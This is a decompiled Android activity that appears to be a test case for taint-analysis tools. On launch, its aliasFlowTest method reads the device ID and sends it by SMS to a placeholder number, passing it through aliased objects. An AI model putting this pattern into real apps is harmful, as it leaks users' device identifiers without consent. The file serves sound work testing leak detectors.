// 
// Decompiled by Procyon v1.0-SNAPSHOT
// 

package de.ecspride;

import android.view.View;
import android.view.ViewGroup;
import android.view.LayoutInflater;
import android.view.MenuItem;
import android.view.Menu;
import android.support.v4.app.Fragment;
import android.os.Bundle;
import android.app.PendingIntent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.support.v7.app.ActionBarActivity;

public class MainActivity extends ActionBarActivity
{
    private void aliasFlowTest() {
        final String deviceId = ((TelephonyManager)this.getSystemService("phone")).getDeviceId();
        final B b = new B();
        B b2 = new B();
        A attr = new A();
        final A a = new A();
        if (Math.random() < 0.5) {
            b2 = b;
        }
        else {
            attr = a;
        }
        b2.attr = attr;
        a.b = deviceId;
        SmsManager.getDefault().sendTextMessage("+49 1234", (String)null, b.attr.b, (PendingIntent)null, (PendingIntent)null);
    }
    
    @Override
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2130903064);
        if (bundle == null) {
            this.getSupportFragmentManager().beginTransaction().add(2131034172, new PlaceholderFragment()).commit();
        }
        this.aliasFlowTest();
    }
    
    public boolean onCreateOptionsMenu(final Menu menu) {
        this.getMenuInflater().inflate(2131492864, menu);
        return true;
    }
    
    public boolean onOptionsItemSelected(final MenuItem menuItem) {
        return menuItem.getItemId() == 2131034173 || super.onOptionsItemSelected(menuItem);
    }
    
    class A
    {
        public String b;
        
        A() {
            this.b = "Y";
        }
    }
    
    public class B
    {
        public A attr;
    }
    
    public static class PlaceholderFragment extends Fragment
    {
        @Override
        public View onCreateView(final LayoutInflater layoutInflater, final ViewGroup viewGroup, final Bundle bundle) {
            return layoutInflater.inflate(2130903065, viewGroup, false);
        }
    }
}
